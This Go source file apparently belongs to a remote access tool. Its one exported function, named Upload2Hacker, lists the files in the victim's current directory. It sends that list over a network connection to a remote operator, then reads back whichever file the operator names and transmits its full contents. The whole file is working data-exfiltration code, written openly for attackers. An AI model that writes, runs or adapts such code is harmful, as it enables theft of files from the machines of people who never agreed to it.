package upload

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strings"
)

type FilesList struct {
	Files []string
}

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func readFileContents(fileName string) ([]byte, error) {
	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println("[-] Unable to open file")
		return nil, err
	}
	defer file.Close()

	stats, err := file.Stat()
	if err != nil {
		fmt.Println("[-] Unable to stat file: ", err)
	}
	fileSize := stats.Size()
	fmt.Println("[+] the file contains ", fileSize, " bytes")

	bytes := make([]byte, fileSize)

	buffer := bufio.NewReader(file)

	_, err = buffer.Read(bytes)
	if err != nil {
		fmt.Println(err)
	}

	return bytes, nil
}

func Upload2Hacker(connection net.Conn) (err error) {

	// get list of file in pwd

	var files []string
	filesArr, err := os.ReadDir(".")
	if err != nil {
		fmt.Println("[-] Failed to read directory: ", err)
	}
	for index, file := range filesArr {
		mode := file.Type()
		if mode.IsRegular() {
			files = append(files, file.Name())
			fmt.Println("\t ", index, "\t", file.Name())
		}
	}
	filesList := &FilesList{Files: files}

	enc := gob.NewEncoder(connection)
	err = enc.Encode(filesList)
	if err != nil {
		fmt.Println(err)
	}

	reader := bufio.NewReader(connection)
	fileName2downloadRaw, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}

	fileName2download := strings.TrimSuffix(fileName2downloadRaw, "\n")

	contents, err := readFileContents(fileName2download)
	if err != nil {
		fmt.Println(err)
	}

	fs := &FileStruct{
		FileName:    fileName2download,
		FileSize:    len(contents),
		FileContent: contents,
	}

	encoder := gob.NewEncoder(connection)
	err = encoder.Encode(fs)
	if err != nil {
		fmt.Println(err)
	}

	return
}
